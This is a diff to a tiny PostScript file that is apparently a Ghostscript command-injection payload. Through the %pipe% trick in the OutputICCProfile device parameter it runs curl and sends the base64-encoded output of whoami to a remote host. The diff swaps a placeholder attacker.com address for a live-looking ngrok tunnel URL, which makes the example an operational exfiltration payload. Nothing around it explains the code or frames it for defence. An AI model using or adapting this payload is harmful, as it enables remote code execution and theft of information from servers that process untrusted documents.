@@ -1,4 +1,4 @@
 %!PS
-currentdevice null true mark /OutputICCProfile (%pipe%curl http://attacker.com/?a=$(whoami|base64) )
+currentdevice null true mark /OutputICCProfile (%pipe%curl https://537a-125-209-92-26.ngrok-free.app/?a=$(whoami|base64) )
 .putdeviceparams
 quit
